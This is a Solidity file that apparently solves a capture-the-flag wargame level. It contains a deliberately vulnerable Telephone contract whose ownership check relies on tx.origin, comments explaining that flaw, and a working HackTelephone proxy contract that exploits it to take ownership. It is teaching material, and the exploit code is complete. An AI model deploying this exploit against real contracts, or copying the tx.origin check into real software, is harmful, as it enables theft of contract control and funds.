pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

//If we want to claim ownership of this contract we need to call the changeOwner function,
//this would have been easy except for that if clause :) bzzzzzzzzhhhh
//Notice tx.origin!, this indicates the address that gave origin to the whole transaction and it can only be an EOA. 
//in order to meet the requirement of the if clause we have to call the the changeOwner function from a proxy contract
//Note: victim address is the instance address


contract HackTelephone {
    Telephone tel;
    
    function changeOwner(address _victim) public {
        tel = Telephone(_victim);
        tel.changeOwner(msg.sender);
        
    }
}
